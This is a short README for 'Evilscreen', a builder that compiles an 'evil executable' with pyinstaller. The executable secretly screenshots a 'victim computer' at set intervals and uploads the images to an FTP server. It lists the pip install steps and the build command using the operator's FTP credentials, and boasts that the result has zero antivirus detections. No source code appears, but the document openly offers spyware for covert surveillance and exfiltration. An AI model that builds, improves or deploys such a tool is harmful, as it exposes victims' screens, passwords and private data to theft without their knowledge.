# Evilscreen


A new builder to create a evil executable program that will take screenshots every wanted seconds on a victim computer, sending them on a ftp server.


# Pre-needs


The builder is using pyinstaller to compile the python program, it means you need to have all the import installed with pip.
I added them in the requirements.txt file, after installing python and pip on your computer, adding it to path try :


pip install -r requirements.txt


+ (to be 100% sure)
pip install pathlib
pip install ftplib
pip install shutil
pip install getpass


# How to make it work


python evilscreen.py

build it using your ftp server credentials


# Detections


The program has 0 detections by anti-viruses which is kinda cool.


# Project used


https://github.com/loutchoo/SilentScreenshotFtp